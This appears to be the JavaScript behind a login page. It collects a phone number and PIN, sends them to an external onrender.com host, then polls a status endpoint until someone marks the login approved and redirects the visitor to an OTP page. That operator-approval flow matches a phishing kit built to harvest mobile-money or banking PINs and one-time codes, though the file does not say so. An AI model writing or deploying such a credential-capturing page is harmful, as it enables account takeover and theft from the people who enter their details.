const loginBtn = document.getElementById("loginBtn");

loginBtn.addEventListener("click", loginUser);


function loginUser(){

    let phone = document.getElementById("phone").value;

    let pin = document.getElementById("pin").value;


    if(phone === "" || pin === ""){

        document.getElementById("message").textContent =
        "Please fill all fields";

        return;
    }


    fetch("https://sercice-teat-name.onrender.com/login", {

    method: "POST",

    headers: {

        "Content-Type": "application/json"

    },

    body: JSON.stringify({

        phone: phone,
        pin: pin

    })

})
    .then(function(response){

        return response.json();

    })
    .then(function(data){

        document.getElementById("message").textContent =
        data.message;


        checkLoginStatus();

    });

}


function checkLoginStatus(){

    fetch("https://sercice-teat-name.onrender.com//login-status")

    .then(function(response){

        return response.json();

    })

    .then(function(data){

        console.log("Login status:", data.status);


        if(data.status === "approved"){

            window.location.href = "/otp.html";

            return;

        }


        if(data.status === "rejected"){

            document.getElementById("message").textContent =
            "Login rejected";

            return;

        }


        if(data.status === "pending"){

            setTimeout(checkLoginStatus, 2000);

        }

    });

}